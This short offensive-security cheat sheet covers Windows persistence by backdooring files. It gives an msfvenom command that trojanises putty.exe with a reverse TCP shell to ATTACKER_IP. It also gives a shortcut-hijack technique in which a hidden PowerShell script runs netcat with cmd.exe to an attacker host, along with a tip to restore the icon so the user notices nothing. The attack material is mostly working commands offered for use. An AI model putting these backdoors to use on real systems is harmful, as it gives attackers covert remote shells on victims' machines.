# Windows Persistence - Backdooring Files

## Injecting Executables Files

Look for shortcuts and executables that potentially used frequently; changing the properties of the file the user interacts by downloading and configure to execute an additional payload silently by adding an extra thread in the binary. Check to if would work on user's end also.

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=$ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

This is not that sneaky, but effective.

## Shortcut File Target Injection

Of Shortcut's properties change the "Target:" to `powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1` with `backdoor.ps1` be:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
# Path to orginal execuable below to create illusion th same process will run when shortcut is used
C:\Windows\Systenm32...
```

Make sure to "Change Icon..."  to revert any visble changes to the Icon display ni the GUI after editing this Shortcut.